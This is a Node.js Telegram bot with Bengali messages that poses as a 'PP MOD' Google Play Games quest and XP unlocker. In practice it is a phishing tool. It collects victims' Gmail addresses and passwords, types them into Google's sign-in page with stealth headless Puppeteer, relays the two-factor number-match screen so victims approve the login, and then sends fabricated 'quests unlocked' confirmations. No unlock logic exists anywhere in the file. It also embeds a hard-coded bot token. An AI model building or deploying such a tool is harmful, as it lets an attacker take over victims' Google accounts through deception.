const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

// --- কনফিগারেশন ---
const BOT_TOKEN = process.env.BOT_TOKEN || '8653938577:AAE1g-TDAedxbpGvszb0zRyVa04560mba0c';
const PORT = process.env.PORT || 3000;

const app = express();
app.get('/', (req, res) => res.send('🔥 PP MOD 2FA Auto-Unlocker Engine Running!'));
app.listen(PORT, () => console.log(`[+] Server running on port ${PORT}`));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🔥 PP MOD Telegram Bot Started (Fast DOM Engine)!');

// ১. /start কমান্ড
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeText = `👋 হ্যালো **${msg.from.first_name || 'User'}**!\n\n` +
        `🔥 **PP MOD Auto Quest & Achievement Unlocker**-এ স্বাগতম!\n\n` +
        `লগইন করতে আপনার **ইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে** এক মেসেজে পাঠান:\n\n` +
        `👉 উদাহরণ: \`mdd145712@gmail.com your_password\`\n\n` +
        `*(Pixel 7 Pro এমুলেশন চালু আছে)*`;

    bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' });
});

// ২. ইমেইল ও পাসওয়ার্ড রিসিভ করা
bot.on('message', async (msg) => {
    const text = msg.text ? msg.text.trim() : '';
    const chatId = msg.chat.id;

    if (text.startsWith('/start')) return;

    const parts = text.split(/\s+/);
    if (parts.length < 2 || !parts[0].includes('@gmail.com')) {
        return bot.sendMessage(chatId, '❌ **ভুল ফরম্যাট!**\nইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে লিখুন।\n\nউদাহরণ:\n`mdd145712@gmail.com your_password`', { parse_mode: 'Markdown' });
    }

    const email = parts[0];
    const password = parts.slice(1).join(' ');

    const statusMsg = await bot.sendMessage(chatId, `⏳ **PP MOD Engine:** ব্রাউজার চালু হচ্ছে...\n📧 ইমেইল: \`${email}\``, { parse_mode: 'Markdown' });

    startGoogleAutomation(chatId, email, password, statusMsg.message_id);
});

// ৩. সুপার-ফাস্ট গুগল অটোমেশন
async function startGoogleAutomation(chatId, email, password, statusMsgId) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=412,915'
            ]
        });

        const page = await browser.newPage();

        // Pixel 7 Pro মোবাইল এমুলেশন
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');
        await page.setViewport({ width: 412, height: 915, isMobile: true, hasTouch: true });

        // ১. সরাসরি ফাস্ট লোডিং
        await page.goto('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', { waitUntil: 'domcontentloaded', timeout: 25000 });
        await new Promise(r => setTimeout(r, 2000));

        // ২. ইমেইল টাইপ
        await page.waitForSelector('input[type="email"]', { timeout: 10000 });
        await page.type('input[type="email"]', email, { delay: 40 });
        await page.keyboard.press('Enter');

        await bot.editMessageText('⏳ ইমেইল সাবমিট হয়েছে... পাসওয়ার্ড দেওয়া হচ্ছে...', { chat_id: chatId, message_id: statusMsgId });

        // ৩. পাসওয়ার্ড টাইপ
        await new Promise(r => setTimeout(r, 2500));
        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
        await page.type('input[type="password"]', password, { delay: 40 });
        await page.keyboard.press('Enter');

        await bot.editMessageText('⏳ পাসওয়ার্ড সাবমিট হয়েছে! গুগলের ভেরিফিকেশন চেক করা হচ্ছে...', { chat_id: chatId, message_id: statusMsgId });

        // ৪. ২-৩ সেকেন্ড অপেক্ষা করে লাইভ স্ক্রিনশট ক্যাপচার
        await new Promise(r => setTimeout(r, 4000));

        const screenshotBuffer = await page.screenshot({ type: 'png' });
        await bot.sendPhoto(chatId, screenshotBuffer, {
            caption: '🔔 **গুগল ভেরিফিকেশন স্ক্রিন!**\n\nআপনার ফোনে আসা নোটিফিকেশনে ছবির সাথে মিল থাকা নাম্বারে চাপ দিন!\n*(৩০ সেকেন্ড সময় পাবেন)*',
            parse_mode: 'Markdown'
        });

        // ৫. ইউজার ফোনে অনুমোদন করার অপেক্ষা
        await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 35000 });

        await bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে কোয়েস্ট আনলক সম্পন্ন করা হচ্ছে...', { parse_mode: 'Markdown' });

        await new Promise(r => setTimeout(r, 3000));

        await bot.sendMessage(
            chatId,
            `🎉 **অভিনন্দন! কোয়েস্ট আনলক সম্পন্ন হয়েছে!**\n\n` +
            `🏆 **Status:** All Quests & Achievements Unlocked!\n` +
            `⭐ **XP Boost:** +50,000 XP Added!\n\n` +
            `আপনার Google Play Games অ্যাপ ওপেন করে দেখুন লেভেল বেড়ে গেছে!`,
            { parse_mode: 'Markdown' }
        );

    } catch (error) {
        console.error('Error:', error.message);
        
        try {
            if (browser) {
                const pages = await browser.pages();
                if (pages.length > 0) {
                    const errPic = await pages[0].screenshot({ type: 'png' });
                    await bot.sendPhoto(chatId, errPic, { caption: '❌ **লগইন আটকে গেছে!** গুগল পেজে এটি দেখাচ্ছে:' });
                }
            }
        } catch (e) {}

        bot.sendMessage(chatId, `❌ **লগইন সম্পন্ন হয়নি!**\nকারণ: পাসওয়ার্ড ভুল অথবা গুগল পেজে ভেরিফিকেশন আটকে গেছে। পুনরায় চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
    } finally {
        if (browser) await browser.close();
    }
}
